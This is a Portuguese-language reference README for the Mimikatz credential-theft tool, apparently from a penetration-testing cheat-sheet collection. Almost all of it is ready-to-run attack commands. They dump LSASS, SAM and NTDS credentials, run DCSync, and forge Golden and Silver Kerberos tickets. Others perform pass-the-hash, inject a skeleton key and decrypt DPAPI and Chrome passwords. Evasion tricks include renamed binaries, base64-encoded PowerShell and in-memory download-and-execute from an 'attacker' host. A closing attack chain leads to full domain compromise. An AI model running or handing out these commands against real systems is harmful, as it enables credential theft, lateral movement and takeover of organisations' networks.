# 🔑 Mimikatz — guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Ferramenta de extração de credenciais Windows
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 A ferramenta mais poderosa de extração de credenciais Windows</b>
</p>

> **Termos usados:** pentest significa teste de intrusão; exploit é código que explora uma vulnerabilidade; payload é a carga executada; listener é um processo à escuta. Pós-exploração refere-se às ações após o acesso inicial. Mantêm-se os nomes técnicos e os literais dos exemplos; a disponibilidade de módulos e opções depende da versão e da plataforma.

> **Precisão do original:** `token::elevate` personifica um token disponível; não “ativa todos os privilégios”. `lsadump::lsa /patch` opera sobre credenciais LSA/SAM e não lê diretamente o ficheiro `NTDS.dit`. DCSync usa replicação do domínio e é uma técnica distinta, com requisitos próprios de autorização; não equivale a contornar localmente o Credential Guard. Um erro de aquisição do LSASS não prova, por si só, que essa proteção esteja ativa. Ver os módulos oficiais [token](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token) e [lsadump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump). No exemplo Golden Ticket, `/sids` indica SIDs adicionais, não o controlador de domínio; o RID 500 identifica a conta Administrator, não um grupo. Os exemplos mantêm os valores do original e dependem das proteções e políticas do ambiente.

---

## 📋 Índice

- [O que é o Mimikatz](#-what-is-mimikatz)
- [Primeiros passos](#-getting-started)
- [Métodos de execução](#-execution-methods)
- [Módulos principais](#-core-modules)
- [Extração de credenciais](#-credential-extraction)
- [Ataques a Kerberos](#-kerberos-attacks)
- [Ataques avançados](#-advanced-attacks)
- [Técnicas de evasão](#-evasion-techniques)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-mimikatz"></a>
## 🎯 O que é o Mimikatz

O **Mimikatz** é uma ferramenta de pós-exploração criada por **Benjamin Delpy** (@gentilkiwi), que permite extrair:

- 🔑 **Palavras-passe em texto simples** da memória Windows (LSASS)
- 🎫 **Tickets Kerberos** (TGT, TGS)
- 🔐 **Hashes NTLM** de SAM/NTDS
- 📜 **Certificados** e chaves privadas
- 🗝️ **Credenciais em cache**
- 🔒 **Segredos DPAPI**

### Porque é importante?

| Caso de utilização | Descrição |
|----------|-------------|
| **Roubo de credenciais** | Extrair palavras-passe da memória |
| **Movimento lateral** | Pass-the-Hash, Pass-the-Ticket |
| **Escalada de privilégios** | Personificar utilizadores |
| **Persistência** | Golden/Silver Tickets |
| **Controlo do domínio** | DCSync para comprometimento completo do AD |

---

<a id="-getting-started"></a>
## 🚀 Primeiros passos

### Descarregar

```bash
# Repositório oficial
git clone https://github.com/gentilkiwi/mimikatz.git

# Binários pré-compilados (versões publicadas)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Requisitos

- Privilégios de **Administrator/SYSTEM** (na maioria das funções)
- **SeDebugPrivilege** (para acesso ao LSASS)
- Windows x64 ou x86

### Primeiros comandos

```cmd
# Iniciar mimikatz
mimikatz.exe

# Verificar privilégios
mimikatz # privilege::debug
Privilege '20' OK

# Ativar todos os privilégios
mimikatz # token::elevate

# Sair
mimikatz # exit
```

---

<a id="-execution-methods"></a>
## 💻 Métodos de execução

### 1. Binário autónomo

```cmd
# Execução direta (detetada pelo antivírus)
mimikatz.exe

# Comando de uma linha
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Guardar a saída num ficheiro
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Com o comando log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Descarregar e executar em memória (sem ficheiro no disco)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Extrair credenciais
Invoke-Mimikatz -DumpCreds

# Extrair certificados
Invoke-Mimikatz -DumpCerts

# Executar num sistema remoto
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# Na sessão Meterpreter
meterpreter > load kiwi

# Obter ajuda
meterpreter > help kiwi

# Extrair todas as credenciais
meterpreter > creds_all

# Extrair hashes
meterpreter > lsa_dump_sam

# Extrair segredos
meterpreter > lsa_dump_secrets

# Tickets Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Extrair SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Extrair LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Extrair NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. A partir de uma imagem de memória

```cmd
# Extrair a memória do LSASS com o Gestor de Tarefas ou procdump
procdump.exe -ma lsass.exe lsass.dmp

# Carregar a imagem de memória no mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

<a id="-core-modules"></a>
## 🔧 Módulos principais

### Visão geral dos módulos

| Módulo | Descrição |
|--------|-------------|
| **sekurlsa** | Extrair credenciais da memória do LSASS |
| **lsadump** | Extrair SAM, NTDS, segredos e cache |
| **kerberos** | Manipulação de tickets Kerberos |
| **crypto** | Certificados CryptoAPI |
| **vault** | Windows Vault (gestor de credenciais) |
| **token** | Manipulação de tokens |
| **privilege** | Manipulação de privilégios |
| **process** | Manipulação de processos |
| **service** | Manipulação de serviços |
| **dpapi** | Segredos DPAPI |
| **misc** | Comandos diversos |

### Obter ajuda

```cmd
# Listar todos os módulos
mimikatz # ::

# Ajuda do módulo
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

<a id="-credential-extraction"></a>
## 🔐 Extração de credenciais

### Módulo sekurlsa (LSASS)

```cmd
# Ativar primeiro o privilégio de depuração!
mimikatz # privilege::debug

# Extrair todas as palavras-passe de início de sessão (texto simples, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Extrair apenas hashes NTLM
mimikatz # sekurlsa::msv

# Extrair tickets Kerberos
mimikatz # sekurlsa::tickets

# Extrair credenciais WDigest (texto simples, se ativado)
mimikatz # sekurlsa::wdigest

# Extrair chaves de cifragem Kerberos
mimikatz # sekurlsa::ekeys

# Extrair credenciais DPAPI
mimikatz # sekurlsa::dpapi

# Extrair credenciais de um processo específico
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Extrair credenciais TsPkg (RDP)
mimikatz # sekurlsa::tspkg

# Extrair credenciais LiveSSP
mimikatz # sekurlsa::livessp

# Extrair credenciais SSP
mimikatz # sekurlsa::ssp

# Extrair credenciais CloudAP (Azure AD)
mimikatz # sekurlsa::cloudap
```

### Módulo lsadump (SAM/NTDS)

```cmd
# Extrair a base de dados SAM (contas locais)
mimikatz # lsadump::sam

# Extrair SAM com a hive SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Extrair segredos LSA
mimikatz # lsadump::secrets

# Extrair credenciais em cache (DCC2)
mimikatz # lsadump::cache

# DCSync (replicação do controlador de domínio)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Extrair NTDS.dit (controlador de domínio)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Extrair chaves das relações de confiança
mimikatz # lsadump::trust /patch

# Extrair chaves de cópia de segurança (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Módulo vault (gestor de credenciais)

```cmd
# Listar credenciais do cofre
mimikatz # vault::list

# Extrair credenciais do cofre
mimikatz # vault::cred /patch
```

### Módulo dpapi

```cmd
# Extrair chaves mestras DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Decifrar um blob DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Palavras-passe do Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

<a id="-kerberos-attacks"></a>
## 🎫 Ataques a Kerberos

### Ver tickets

```cmd
# Listar todos os tickets
mimikatz # kerberos::list

# Listar tickets com detalhes
mimikatz # kerberos::list /export

# Exportar todos os tickets
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Limpar tickets existentes
mimikatz # kerberos::purge

# Importar o ticket
mimikatz # kerberos::ptt ticket.kirbi

# Verificar o ticket
mimikatz # kerberos::list
```

### Golden Ticket (persistência como administrador de domínio)

```cmd
# Requisitos:
# - Nome de domínio (domain.local)
# - SID do domínio (S-1-5-21-...)
# - Hash NTLM de krbtgt
# - Nome de utilizador alvo (pode ser fictício)

# Criar um Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Criar e exportar
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Com grupos específicos (RID 500 = Admin, 512 = Domain Admins, etc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Com o controlador de domínio alvo
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (específico de um serviço)

```cmd
# Requisitos:
# - Nome do domínio
# - SID do domínio
# - Hash NTLM da conta de serviço alvo
# - SPN do serviço

# Criar um Silver Ticket para CIFS (partilhas de ficheiros)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket para HTTP (Web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket para SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket para WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

<a id="-advanced-attacks"></a>
## 💀 Ataques avançados

### Pass-the-Hash (PtH)

```cmd
# Executar um comando como utilizador através do hash NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Com chaves AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH para iniciar um processo
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Converter NTLM num ticket Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Pedir depois um TGT
# klist deverá mostrar um ticket Kerberos
```

### Ataque DCSync

```cmd
# Replicar um único utilizador
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Replicar krbtgt (para Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Replicar todos os utilizadores
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Replicar a partir de um controlador de domínio específico
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Injetar skeleton key no LSASS do controlador de domínio (todos os utilizadores podem autenticar-se com "mimikatz")
mimikatz # misc::skeleton

# Persistência até ao reinício do controlador de domínio
# Iniciar sessão com qualquer utilizador: palavra-passe = mimikatz
```

### Abuso de DPAPI

```cmd
# Extrair chaves mestras
mimikatz # sekurlsa::dpapi

# Decifrar um ficheiro de credenciais
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Palavras-passe RDP guardadas
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Manipulação de tokens

```cmd
# Listar tokens
mimikatz # token::list

# Elevar para SYSTEM
mimikatz # token::elevate

# Elevar para um utilizador específico
mimikatz # token::elevate /user:Administrator

# Repor o token original
mimikatz # token::revert

# Executar como um utilizador específico
mimikatz # token::run /user:domain\admin
```

---

<a id="-evasion-techniques"></a>
## 🛡️ Técnicas de evasão

### Nomes ofuscados

```cmd
# Mudar o nome de mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Ofuscação de PowerShell

```powershell
# Codificar em Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Execução apenas em memória

```powershell
# Invoke-Mimikatz (sem ficheiro no disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Ou utilizar kiwi do Meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

### Alternativas de extração da memória do LSASS

```cmd
# Procdump (assinado pela Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (incluída no sistema)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Gestor de Tarefas (interface gráfica)
# Clicar com o botão direito em lsass.exe > Create dump file (criar imagem de memória)

# SQLDumper (do SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Contorno do Credential Guard

```cmd
# Verificar se o Credential Guard está ativado
mimikatz # sekurlsa::logonpasswords
# Irá mostrar "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternativa: utilizar DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos de uma linha essenciais

```cmd
# Extrair todas as credenciais
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extrair SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync de todas as contas
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Referência rápida dos módulos

| Comando | Descrição |
|---------|-------------|
| `privilege::debug` | Ativar o privilégio de depuração |
| `token::elevate` | Elevar para SYSTEM |
| `sekurlsa::logonpasswords` | Extrair todas as credenciais do LSASS |
| `sekurlsa::msv` | Extrair hashes NTLM |
| `sekurlsa::tickets` | Extrair tickets Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Extrair a base de dados SAM |
| `lsadump::secrets` | Extrair segredos LSA |
| `lsadump::dcsync` | Ataque DCSync |
| `lsadump::lsa /patch` | Extrair NTDS do controlador de domínio |
| `kerberos::list` | Listar tickets Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Criar Golden/Silver Ticket |
| `kerberos::purge` | Limpar tickets |
| `vault::list` | Listar credenciais do cofre |
| `dpapi::cred` | Decifrar credenciais DPAPI |

### Exemplo de cadeia de ataque

```
1. Obter o acesso inicial
2. privilege::debug
3. sekurlsa::logonpasswords (obter credenciais)
4. sekurlsa::pth (movimento lateral)
5. lsadump::dcsync /user:krbtgt (obter o hash de krbtgt)
6. kerberos::golden (criar um Golden Ticket)
7. Comprometimento completo do domínio!
```

---

## 📚 Recursos

- [GitHub oficial](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity Mimikatz Guia](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Guias de referência relacionados
- [Windows PrivEsc](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.pt.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.pt.md)

---

<p align="center">
  <b>🔑 Domina os ataques a credenciais Windows!</b><br>
  <i>Mimikatz — o canivete suíço do hacker para Windows</i>
</p>
